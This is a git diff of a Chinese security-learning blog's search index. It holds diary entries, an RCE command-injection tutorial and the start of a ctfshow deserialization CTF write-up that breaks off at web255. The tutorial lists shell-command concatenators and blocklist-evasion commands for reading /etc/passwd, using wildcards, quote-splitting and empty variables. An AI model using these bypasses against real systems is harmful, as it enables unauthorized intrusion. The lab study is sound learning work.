@@ -95,29 +95,6 @@
       </tags>
   </entry>
   <entry>
-    <title>惜</title>
-    <url>/2022/11/06/Diary_1106/</url>
-    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
-<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
-<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
-<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
-<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
-<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>锦瑟</title>
     <url>/2022/11/05/Diary_1105/</url>
     <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
@@ -139,6 +116,29 @@
 </li>
 </ol>
 <h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>日志写到这里，下次缩减一些，今天都写了半个多小时了</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>惜</title>
+    <url>/2022/11/06/Diary_1106/</url>
+    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
+<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
+<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
+<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
+<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
+<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -927,75 +927,6 @@ y 输出了 undefined，这是因为变量声明 (var y) 提升了，但是初�
       </tags>
   </entry>
   <entry>
-    <title>RCE漏洞</title>
-    <url>/2022/12/10/RCE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于来到RCE了，感觉在漏洞中会很常见。</p>
-<span id="more"></span>
-<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RCE（remote command&#x2F;code execute），远程命令&#x2F;代码执行。RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。</p>
-<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。比如常见的路由器，防火墙，入侵检测等设备的web管理界面上。一般会给用户提供ping操作的web界面。<br>用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交不符合预期的命令，并让后台执行，从而控制整个后台服务器。<br>现在很多企业开始实施自动化运维，大量系统操作会通过“自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行漏洞。远程代码执行 同样的道理，因为需求设计，后台有时也会把用户的输入作为代码的一部分执行，也就造成RCE漏洞。比如代码执行的函数，不安全的反序列化等等。<br>因此，如果需要给前端用户提供操作类的API接口，一定要对接口输入的内容进行严格判断，比如实施严格的白名单策略会是一个比较好的办法。</p>
-<h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="代码层过滤不严"><a href="#代码层过滤不严" class="headerlink" title="代码层过滤不严"></a>代码层过滤不严</h2><p>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：</p>
-<pre><code>system(&quot;/bin/program --arg $arg&quot;);
-</code></pre>
-<h2 id="系统漏洞造成命令注入"><a href="#系统漏洞造成命令注入" class="headerlink" title="系统漏洞造成命令注入"></a>系统漏洞造成命令注入</h2><pre><code>比如：bash破壳漏洞（CVE-2014-6217）
-</code></pre>
-<h2 id="调用的第三方组件存在代码执行漏洞"><a href="#调用的第三方组件存在代码执行漏洞" class="headerlink" title="调用的第三方组件存在代码执行漏洞"></a>调用的第三方组件存在代码执行漏洞</h2><pre><code>如wordpress中用来处理图片的imageMagick组件
-Java中的命令执行漏洞（struts2/ElasticsearchGroovy等）
-ThinkPHP5.x的命令执行
-</code></pre>
-<h1 id="命令执行漏洞的利用条件"><a href="#命令执行漏洞的利用条件" class="headerlink" title="命令执行漏洞的利用条件"></a>命令执行漏洞的利用条件</h1><ol>
-<li>开发人员调用了能够执行系统命令的函数</li>
-<li>这个函数的参数可控（即用户能够控制）</li>
-<li>开发人员没有对该函数的参数进行过滤或过滤不严</li>
-</ol>
-<h1 id="可能存在命令执行漏洞的函数（PHP）"><a href="#可能存在命令执行漏洞的函数（PHP）" class="headerlink" title="可能存在命令执行漏洞的函数（PHP）"></a>可能存在命令执行漏洞的函数（PHP）</h1><h2 id="利用系统函数实现命令执行的函数"><a href="#利用系统函数实现命令执行的函数" class="headerlink" title="利用系统函数实现命令执行的函数"></a>利用系统函数实现命令执行的函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(), assert(), preg_replace(), call_user_func()</span><br></pre></td></tr></table></figure>
-<p>如果页面存在以上函数且对用户输入没有作严格过滤，那么可能会造成远程命令执行漏洞，除此之外还有其它函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ob_start(), unserialize(), creat_function(), uasort(), uksort(), array_filter(), array_reduce()</span><br></pre></td></tr></table></figure>
-
-<h2 id="直接执行系统命令的代码函数"><a href="#直接执行系统命令的代码函数" class="headerlink" title="直接执行系统命令的代码函数"></a>直接执行系统命令的代码函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(), exec(), shell_exec(), passthru(), pcntl_exec(), popen(), proc_open(), 反引号</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="命令拼接符号"><a href="#命令拼接符号" class="headerlink" title="命令拼接符号"></a>命令拼接符号</h1><p>命令拼接符号可以连接多个命令，恶意命令通常拼接在正常命令后面。</p>
-<h2 id="Windows的系统命令拼接符"><a href="#Windows的系统命令拼接符" class="headerlink" title="Windows的系统命令拼接符"></a>Windows的系统命令拼接符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拼接符 		示例 		解释</span><br><span class="line">&amp; 		A&amp;B 		无论A是false还是true，B都执行。即互不影响</span><br><span class="line">&amp;&amp; 		A&amp;&amp;B 		具有短路效果，A是false，B就不执行</span><br><span class="line">| 		A|B 		表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行</span><br><span class="line">|| 		A||B 		表示A命令语句执行失败，然后才执行B命令语句</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux的系统命令拼接符"><a href="#Linux的系统命令拼接符" class="headerlink" title="Linux的系统命令拼接符"></a>Linux的系统命令拼接符</h2><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>&amp;的作用是使命令在后台执行。只要在命令后面跟上一个空格和&amp;，可以一口气在后台运行多个命令。需要停止，就是kill -s 进程号。如下所示：<br><img src="/simg/rce_1.png" alt=" "></p>
-<h3 id=""><a href="#" class="headerlink" title=";"></a>;</h3><p>分号（;）作用是进行多条命令的无关联执行，每一条执行结果互不影响，示例如下：<br><img src="/simg/rce_2.png" alt=" "></p>
-<h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>&amp;&amp;的用法和功能与Windows相同，都是左边成功右边才能执行。</p>
-<h3 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h3><p>||的用法和功能与Windows相同，都是前面执行失败才执行后面。</p>
-<h3 id="-2"><a href="#-2" class="headerlink" title="()"></a>()</h3><p>如果想执行几条命令，则需要用命令分隔符分号隔开每条命令，并使用圆括号()把所有命令组合起来，示例如下：<br><img src="/simg/rce_3.png" alt=" "></p>
-<h2 id="常用命令总述"><a href="#常用命令总述" class="headerlink" title="常用命令总述"></a>常用命令总述</h2><p>使用时不要局限于单个的，简单的用法，因为很多过滤参数的方式都是识别对应的拼接符，所以要思维变通，很多时候，大量拼接符层层嵌套往往会有出其不意的效果<br>    比如上面这个圆括号的使用例子，意思就是当echo 1 执行成功后会执行后面的命令，把echo 1输出到 11.txt ，然后复制11.txt到根目录。 结合||和&amp;&amp;可以实现复杂的功能。</p>
-<h1 id="常用绕开防护的方法"><a href="#常用绕开防护的方法" class="headerlink" title="常用绕开防护的方法"></a>常用绕开防护的方法</h1><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ul>
-<li>常见通配符如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">符号 	含义</span><br><span class="line">? 		匹配单个字符，匹配多个字符需要多个?连用</span><br><span class="line">* 		*代表任意数量的字符</span><br><span class="line">[] 		代表一定有一个在括号内的字符（非任意字符），例如[abcd]代表一定有一个字符，可能是a,b,c,d这四个中任何一个</span><br></pre></td></tr></table></figure></li>
-<li>使用示例：<br>一个常用的读取密码命令如下：<br><code>cat /etc/passwd</code><br>可以搭配多种通配符使用。<br>使用?通配符后，可能会有多种变化，比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /?tc/?as?wd</span><br><span class="line">cat /*tc/*as*wd</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h2><ul>
-<li>常见连接符<br><code>单引号（&#39;）双引号（&quot;）反斜杠（\）  如：/&#39;b&#39;i&#39;n&#39;/&#39;c&#39;a&#39;t/&#39;e&#39;t&#39;c&#39;/&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</code></li>
-<li>使用示例：<br><img src="/simg/rce_4.png" alt=" "></li>
-</ul>
-<h2 id="未初始化变量"><a href="#未初始化变量" class="headerlink" title="未初始化变量"></a>未初始化变量</h2><ul>
-<li>简介<br>未初始化的变量值都是null，例如a,a,a,b，在Linux环境下都输出为null，所以可以用未初始化变量加在一些命令的末尾，来绕过一些黑名单。</li>
-<li>使用示例<br><code>cat$a /etc$a/passwd$a</code><br><img src="/simg/rce_5.png" alt=" "></li>
-</ul>
-<h1 id="常见位置"><a href="#常见位置" class="headerlink" title="常见位置"></a>常见位置</h1><p>各种cms框架的命令执行漏洞是最多的，着重在这些地方找。除此之外就是插件位置，插件因为各种原因经常也需要执行系统命令。当然其它地方也有。</p>
-<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ol>
-<li>各种框架、插件等都可能出现命令执行，升级到新版本，多打补丁</li>
-<li>关注行业最新安全动态，一旦爆发命令执行漏洞，迅速修复，避免造成更大影响</li>
-<li>少用框架&#x2F;cms</li>
-<li>可以过滤一些符号从而减少一些危险</li>
-<li>安全配置好php相关参数<br>php配置文件里有个disable_functions的配置，这个禁止某些php函数，服务器便是用这个来禁止php的执行命令函数。<br>例如：disable_functions&#x3D;system,passthru,shell_exec,exec,popen便禁止了用这些函数来执行系统命令</li>
-<li>升级中间件</li>
-<li>严格控制传入变量，严禁使用魔法函数</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>大多只是看了，没有实际操作，得加强一下实战方面。</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_63844103/article/details/126953630?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126953630-blog-118893434.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126953630-blog-118893434.pc_relevant_default&utm_relevant_index=2">命令执行漏洞（RCE）详解</a><br><a href="https://blog.csdn.net/weixin_46706771/article/details/118893434">RCE(远程代码执行漏洞)原理及漏洞利用</a></p>
-]]></content>
-      <categories>
-        <category>RCE</category>
-      </categories>
-      <tags>
-        <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python期末专题</title>
     <url>/2022/11/13/Python%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当撰写这篇Python复习专题的时候，距离期末考试仅剩3天。<br>我啊，真是堕落。&#x2F;(ㄒoㄒ)&#x2F;~~<br>本篇复习主要以两次测试以及题库为主，其它作为补充。</p>
@@ -1350,6 +1281,75 @@ ThinkPHP5.x的命令执行
         <tag>SQL注入</tag>
         <tag>字符型</tag>
         <tag>数字型</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCE漏洞</title>
+    <url>/2022/12/10/RCE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于来到RCE了，感觉在漏洞中会很常见。</p>
+<span id="more"></span>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RCE（remote command&#x2F;code execute），远程命令&#x2F;代码执行。RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。比如常见的路由器，防火墙，入侵检测等设备的web管理界面上。一般会给用户提供ping操作的web界面。<br>用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交不符合预期的命令，并让后台执行，从而控制整个后台服务器。<br>现在很多企业开始实施自动化运维，大量系统操作会通过“自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行漏洞。远程代码执行 同样的道理，因为需求设计，后台有时也会把用户的输入作为代码的一部分执行，也就造成RCE漏洞。比如代码执行的函数，不安全的反序列化等等。<br>因此，如果需要给前端用户提供操作类的API接口，一定要对接口输入的内容进行严格判断，比如实施严格的白名单策略会是一个比较好的办法。</p>
+<h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="代码层过滤不严"><a href="#代码层过滤不严" class="headerlink" title="代码层过滤不严"></a>代码层过滤不严</h2><p>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：</p>
+<pre><code>system(&quot;/bin/program --arg $arg&quot;);
+</code></pre>
+<h2 id="系统漏洞造成命令注入"><a href="#系统漏洞造成命令注入" class="headerlink" title="系统漏洞造成命令注入"></a>系统漏洞造成命令注入</h2><pre><code>比如：bash破壳漏洞（CVE-2014-6217）
+</code></pre>
+<h2 id="调用的第三方组件存在代码执行漏洞"><a href="#调用的第三方组件存在代码执行漏洞" class="headerlink" title="调用的第三方组件存在代码执行漏洞"></a>调用的第三方组件存在代码执行漏洞</h2><pre><code>如wordpress中用来处理图片的imageMagick组件
+Java中的命令执行漏洞（struts2/ElasticsearchGroovy等）
+ThinkPHP5.x的命令执行
+</code></pre>
+<h1 id="命令执行漏洞的利用条件"><a href="#命令执行漏洞的利用条件" class="headerlink" title="命令执行漏洞的利用条件"></a>命令执行漏洞的利用条件</h1><ol>
+<li>开发人员调用了能够执行系统命令的函数</li>
+<li>这个函数的参数可控（即用户能够控制）</li>
+<li>开发人员没有对该函数的参数进行过滤或过滤不严</li>
+</ol>
+<h1 id="可能存在命令执行漏洞的函数（PHP）"><a href="#可能存在命令执行漏洞的函数（PHP）" class="headerlink" title="可能存在命令执行漏洞的函数（PHP）"></a>可能存在命令执行漏洞的函数（PHP）</h1><h2 id="利用系统函数实现命令执行的函数"><a href="#利用系统函数实现命令执行的函数" class="headerlink" title="利用系统函数实现命令执行的函数"></a>利用系统函数实现命令执行的函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(), assert(), preg_replace(), call_user_func()</span><br></pre></td></tr></table></figure>
+<p>如果页面存在以上函数且对用户输入没有作严格过滤，那么可能会造成远程命令执行漏洞，除此之外还有其它函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ob_start(), unserialize(), creat_function(), uasort(), uksort(), array_filter(), array_reduce()</span><br></pre></td></tr></table></figure>
+
+<h2 id="直接执行系统命令的代码函数"><a href="#直接执行系统命令的代码函数" class="headerlink" title="直接执行系统命令的代码函数"></a>直接执行系统命令的代码函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(), exec(), shell_exec(), passthru(), pcntl_exec(), popen(), proc_open(), 反引号</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="命令拼接符号"><a href="#命令拼接符号" class="headerlink" title="命令拼接符号"></a>命令拼接符号</h1><p>命令拼接符号可以连接多个命令，恶意命令通常拼接在正常命令后面。</p>
+<h2 id="Windows的系统命令拼接符"><a href="#Windows的系统命令拼接符" class="headerlink" title="Windows的系统命令拼接符"></a>Windows的系统命令拼接符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拼接符 		示例 		解释</span><br><span class="line">&amp; 		A&amp;B 		无论A是false还是true，B都执行。即互不影响</span><br><span class="line">&amp;&amp; 		A&amp;&amp;B 		具有短路效果，A是false，B就不执行</span><br><span class="line">| 		A|B 		表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行</span><br><span class="line">|| 		A||B 		表示A命令语句执行失败，然后才执行B命令语句</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux的系统命令拼接符"><a href="#Linux的系统命令拼接符" class="headerlink" title="Linux的系统命令拼接符"></a>Linux的系统命令拼接符</h2><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>&amp;的作用是使命令在后台执行。只要在命令后面跟上一个空格和&amp;，可以一口气在后台运行多个命令。需要停止，就是kill -s 进程号。如下所示：<br><img src="/simg/rce_1.png" alt=" "></p>
+<h3 id=""><a href="#" class="headerlink" title=";"></a>;</h3><p>分号（;）作用是进行多条命令的无关联执行，每一条执行结果互不影响，示例如下：<br><img src="/simg/rce_2.png" alt=" "></p>
+<h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>&amp;&amp;的用法和功能与Windows相同，都是左边成功右边才能执行。</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h3><p>||的用法和功能与Windows相同，都是前面执行失败才执行后面。</p>
+<h3 id="-2"><a href="#-2" class="headerlink" title="()"></a>()</h3><p>如果想执行几条命令，则需要用命令分隔符分号隔开每条命令，并使用圆括号()把所有命令组合起来，示例如下：<br><img src="/simg/rce_3.png" alt=" "></p>
+<h2 id="常用命令总述"><a href="#常用命令总述" class="headerlink" title="常用命令总述"></a>常用命令总述</h2><p>使用时不要局限于单个的，简单的用法，因为很多过滤参数的方式都是识别对应的拼接符，所以要思维变通，很多时候，大量拼接符层层嵌套往往会有出其不意的效果<br>    比如上面这个圆括号的使用例子，意思就是当echo 1 执行成功后会执行后面的命令，把echo 1输出到 11.txt ，然后复制11.txt到根目录。 结合||和&amp;&amp;可以实现复杂的功能。</p>
+<h1 id="常用绕开防护的方法"><a href="#常用绕开防护的方法" class="headerlink" title="常用绕开防护的方法"></a>常用绕开防护的方法</h1><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ul>
+<li>常见通配符如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">符号 	含义</span><br><span class="line">? 		匹配单个字符，匹配多个字符需要多个?连用</span><br><span class="line">* 		*代表任意数量的字符</span><br><span class="line">[] 		代表一定有一个在括号内的字符（非任意字符），例如[abcd]代表一定有一个字符，可能是a,b,c,d这四个中任何一个</span><br></pre></td></tr></table></figure></li>
+<li>使用示例：<br>一个常用的读取密码命令如下：<br><code>cat /etc/passwd</code><br>可以搭配多种通配符使用。<br>使用?通配符后，可能会有多种变化，比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /?tc/?as?wd</span><br><span class="line">cat /*tc/*as*wd</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h2><ul>
+<li>常见连接符<br><code>单引号（&#39;）双引号（&quot;）反斜杠（\）  如：/&#39;b&#39;i&#39;n&#39;/&#39;c&#39;a&#39;t/&#39;e&#39;t&#39;c&#39;/&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</code></li>
+<li>使用示例：<br><img src="/simg/rce_4.png" alt=" "></li>
+</ul>
+<h2 id="未初始化变量"><a href="#未初始化变量" class="headerlink" title="未初始化变量"></a>未初始化变量</h2><ul>
+<li>简介<br>未初始化的变量值都是null，例如a,a,a,b，在Linux环境下都输出为null，所以可以用未初始化变量加在一些命令的末尾，来绕过一些黑名单。</li>
+<li>使用示例<br><code>cat$a /etc$a/passwd$a</code><br><img src="/simg/rce_5.png" alt=" "></li>
+</ul>
+<h1 id="常见位置"><a href="#常见位置" class="headerlink" title="常见位置"></a>常见位置</h1><p>各种cms框架的命令执行漏洞是最多的，着重在这些地方找。除此之外就是插件位置，插件因为各种原因经常也需要执行系统命令。当然其它地方也有。</p>
+<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ol>
+<li>各种框架、插件等都可能出现命令执行，升级到新版本，多打补丁</li>
+<li>关注行业最新安全动态，一旦爆发命令执行漏洞，迅速修复，避免造成更大影响</li>
+<li>少用框架&#x2F;cms</li>
+<li>可以过滤一些符号从而减少一些危险</li>
+<li>安全配置好php相关参数<br>php配置文件里有个disable_functions的配置，这个禁止某些php函数，服务器便是用这个来禁止php的执行命令函数。<br>例如：disable_functions&#x3D;system,passthru,shell_exec,exec,popen便禁止了用这些函数来执行系统命令</li>
+<li>升级中间件</li>
+<li>严格控制传入变量，严禁使用魔法函数</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>大多只是看了，没有实际操作，得加强一下实战方面。</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_63844103/article/details/126953630?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126953630-blog-118893434.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126953630-blog-118893434.pc_relevant_default&utm_relevant_index=2">命令执行漏洞（RCE）详解</a><br><a href="https://blog.csdn.net/weixin_46706771/article/details/118893434">RCE(远程代码执行漏洞)原理及漏洞利用</a></p>
+]]></content>
+      <categories>
+        <category>RCE</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -1740,6 +1740,100 @@ gopher发送get请求</li>
       </tags>
   </entry>
   <entry>
+    <title>ctfshow-web入门-反序列化</title>
+    <url>/2022/12/27/ctfshow-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始刷反序列化的题咯~</p>
+<span id="more"></span>
+<h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>查看源码<br>通过GET传入两个参数username和password,检查参数是否为空后，将参数传入login函数中比较与ctfShowUser类里定义的username和password是否相等，如果相等则能显示flag，否则不能。</p>
+</li>
+<li><p>构造payload<br>本题与反序列化关联不大，就是绕了个圈子作比较罢了。以下是payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span 